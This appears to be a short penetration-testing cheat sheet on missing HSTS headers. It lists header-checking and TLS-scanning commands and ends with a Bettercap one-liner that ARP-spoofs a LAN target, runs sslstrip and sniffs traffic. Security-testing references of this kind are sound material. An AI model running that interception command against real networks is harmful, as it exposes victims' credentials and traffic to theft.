# HTTP Strict Transport Security

## Check List

* [ ] Review the HSTS header and its validity.

## Cheat Sheet

### Methodology

{% stepper %}
{% step %}
Access the Target URL and Inspect the Response Headers Use a tool such as **Burp Suite**, **cURL**, or **browser dev tools** to inspect the HTTP response headers The best way is to use this cheat sheet Example using cURL
{% endstep %}

{% step %}
Check for HSTS Header Confirm the absence of the following header in the server response `Strict-Transport-Security` _The best way to exploit and exploit this vulnerability is to use a cheat sheet_
{% endstep %}
{% endstepper %}

***

### Recon Header

#### [cURL](https://curl.se/)

```bash
curl -s -D- $WEBSITE | grep -i strict
```

#### [Nmap](https://nmap.org/)

```bash
nmap -sS -sV --mtu 5000 --script ssl-enum-ciphers $WEBSITE
```

### Scan Vulnerabilities

#### [sslyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze $WEBSITE
```

#### [testssl.sh](https://github.com/drwetter/testssl.sh)

```bash
testssl $WEBSITE
```

### MitM

#### [Bettercap](https://www.bettercap.org/)

{% hint style="info" %}
Interface Network
{% endhint %}

```bash
INTERFACE=$(ip -o -4 addr show | awk '{print $2}' | grep -v "lo" | head -n 1)
```

{% hint style="info" %}
MitM on LAN
{% endhint %}

```bash
bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGET; arp.spoof on; http.proxy on; http.proxy.sslstrip true; net.sniff on"
```
